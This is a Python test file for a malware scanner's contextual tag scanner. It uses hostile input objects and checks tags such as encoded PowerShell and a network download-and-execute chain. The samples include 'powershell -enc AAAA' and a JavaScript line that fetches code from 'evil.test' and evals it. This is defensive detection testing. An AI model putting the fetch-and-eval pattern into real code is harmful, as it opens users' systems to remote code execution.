from Virus_Scan.tests.support.canonical_chain_fixtures import physical_tag_evidence
from Virus_Scan.tests.support.static_inventory import read_python_file

from pathlib import Path

from Virus_Scan.detection.api.chain_evaluation import evaluate_chain_evidence
from Virus_Scan.scanners.text_contextual_tags import contextual_tag_scan



class HostileContextualText:
    bool_calls = 0
    str_calls = 0
    repr_calls = 0
    iter_calls = 0

    def __bool__(self):
        type(self).bool_calls += 1
        raise AssertionError("contextual text bool hook touched")

    def __str__(self):
        type(self).str_calls += 1
        raise AssertionError("contextual text str hook touched")

    def __repr__(self):
        type(self).repr_calls += 1
        raise AssertionError("contextual text repr hook touched")

    def __iter__(self):
        type(self).iter_calls += 1
        raise AssertionError("contextual text iter hook touched")


class HostileContextualPath:
    bool_calls = 0
    str_calls = 0
    repr_calls = 0

    def __bool__(self):
        type(self).bool_calls += 1
        raise AssertionError("contextual path bool hook touched")

    def __str__(self):
        type(self).str_calls += 1
        raise AssertionError("contextual path str hook touched")

    def __repr__(self):
        type(self).repr_calls += 1
        raise AssertionError("contextual path repr hook touched")


def _reset() -> None:
    HostileContextualText.bool_calls = 0
    HostileContextualText.str_calls = 0
    HostileContextualText.repr_calls = 0
    HostileContextualText.iter_calls = 0
    HostileContextualPath.bool_calls = 0
    HostileContextualPath.str_calls = 0
    HostileContextualPath.repr_calls = 0


def test_stage1688_contextual_scan_rejects_hostile_text_without_hooks() -> None:
    _reset()

    tags = contextual_tag_scan(HostileContextualText(), path="game/script.rpy")

    assert "unsafe_contextual_text_rejected" in tags
    assert "scanner_failure_evidence_recorded" in tags
    assert "scanner_failure_evidence:text:contextual_tag_scan" in tags
    assert HostileContextualText.bool_calls == 0
    assert HostileContextualText.str_calls == 0
    assert HostileContextualText.repr_calls == 0
    assert HostileContextualText.iter_calls == 0


def test_stage1688_contextual_scan_rejects_hostile_path_without_hooks_and_preserves_text_tags() -> None:
    _reset()

    tags = contextual_tag_scan("powershell -enc AAAA", path=HostileContextualPath())

    assert "unsafe_contextual_path_rejected" in tags
    assert "scanner_failure_evidence_recorded" in tags
    assert "powershell_exec" in tags
    assert "encoded_powershell" in tags
    assert HostileContextualPath.bool_calls == 0
    assert HostileContextualPath.str_calls == 0
    assert HostileContextualPath.repr_calls == 0


def test_stage1688_contextual_scan_preserves_existing_engine_chain_behavior() -> None:
    tags = contextual_tag_scan(
        "var x=new XMLHttpRequest(); x.open('GET','https://evil.test/p.js'); x.onload=function(){ eval(x.responseText); };",
        path="www/js/plugins/evil.js",
    )

    assert "rpgm_js_network_exec_candidate" in tags
    assert "download_execute_chain" not in tags
    assert "network_download" in tags
    evidence = evaluate_chain_evidence(tags=physical_tag_evidence(tuple(tags)))
    decision = next(
        item for item in evidence.decisions
        if item.candidate.chain_id == "anchor:download_execute_chain"
    )
    assert decision.status == "candidate"


def test_stage1688_contextual_scan_source_has_no_truthy_stringification_boundary() -> None:
    source = read_python_file(Path("Virus_Scan/scanners/text_contextual_tags.py"))

    assert "str(text or '')" not in source
    assert "str(path or '')" not in source
    assert "str(needle).lower()" not in source
